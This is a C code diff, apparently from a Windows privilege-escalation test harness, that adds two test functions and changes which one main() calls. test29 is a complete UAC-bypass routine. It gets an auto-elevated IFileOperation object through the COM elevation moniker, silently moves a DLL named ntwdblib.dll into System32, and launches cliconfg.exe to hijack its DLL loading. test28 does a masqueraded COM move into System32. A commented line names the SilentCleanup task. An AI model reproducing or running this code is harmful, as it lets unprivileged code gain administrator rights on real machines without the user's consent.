@@ -556,6 +556,106 @@ void test27() {
 	LogError(L"Hello World");
 }
 
+void test28() {
+	MasqueradedMoveDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexlic", L"C:\\Windows\\System32", FALSE);
+}
+
+void test29()
+{
+	BOOL                cond = FALSE;
+	IFileOperation* FileOperation1 = NULL;
+	IShellItem* isrc = NULL, * idst = NULL;
+	BIND_OPTS3          bop;
+	SHELLEXECUTEINFOW   shexec;
+	HRESULT             r;
+
+	do {
+
+		r = CoInitialize(NULL);
+		if (r != S_OK)
+			break;
+
+		RtlSecureZeroMemory(&bop, sizeof(bop));
+		RtlSecureZeroMemory(&shexec, sizeof(shexec));
+
+		r = CoCreateInstance(&CLSID_FileOperation, NULL,
+			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);
+
+		if (r != S_OK) {
+			break;
+		}
+
+		if (FileOperation1 != NULL) {
+			FileOperation1->lpVtbl->Release(FileOperation1);
+		}
+
+		bop.cbStruct = sizeof(bop);
+		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER/* | CLSCTX_INPROC_HANDLER*/;
+		r = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*)&bop, &IID_IFileOperation, &FileOperation1);
+		if (r != S_OK) {
+			break;
+		}
+		if (FileOperation1 == NULL) {
+			r = E_FAIL;
+			break;
+		}
+
+		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
+			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
+
+		r = SHCreateItemFromParsingName(L"C:\\temp\\ntwdblib.dll",
+			NULL, &IID_IShellItem, &isrc);
+
+		if (r != S_OK) {
+			break;
+		}
+		r = SHCreateItemFromParsingName(L"C:\\windows\\system32\\", NULL, &IID_IShellItem, &idst);
+		if (r != S_OK) {
+			break;
+		}
+
+		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
+		if (r != S_OK) {
+			break;
+		}
+		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
+		if (r != S_OK) {
+			break;
+		}
+
+		idst->lpVtbl->Release(idst);
+		idst = NULL;
+		isrc->lpVtbl->Release(isrc);
+		isrc = NULL;
+
+		shexec.cbSize = sizeof(shexec);
+		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
+		shexec.nShow = SW_SHOW;
+
+		shexec.lpFile = L"C:\\windows\\system32\\cliconfg.exe";
+		shexec.lpParameters = NULL;
+		shexec.lpDirectory = L"C:\\windows\\system32\\";
+		if (ShellExecuteExW(&shexec)) {
+			if (shexec.hProcess != NULL) {
+				WaitForSingleObject(shexec.hProcess, INFINITE);
+				CloseHandle(shexec.hProcess);
+			}
+		}
+
+	} while (cond);
+
+	if (FileOperation1 != NULL) {
+		FileOperation1->lpVtbl->Release(FileOperation1);
+	}
+	if (isrc != NULL) {
+		isrc->lpVtbl->Release(isrc);
+	}
+	if (idst != NULL) {
+		idst->lpVtbl->Release(idst);
+	}
+	CoUninitialize();
+}
+
 int main() {
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
@@ -578,10 +678,12 @@ int main() {
 	//test20();
 	//test21("C:\\Windows\\System32\\cmd.exe");
 	//test22();
-	test23();
+	//test23();
 	//test24();
 	//test25();
 	//test26();
 	//test27();
+	test28();
+	//test29();
 	return 0;
 }
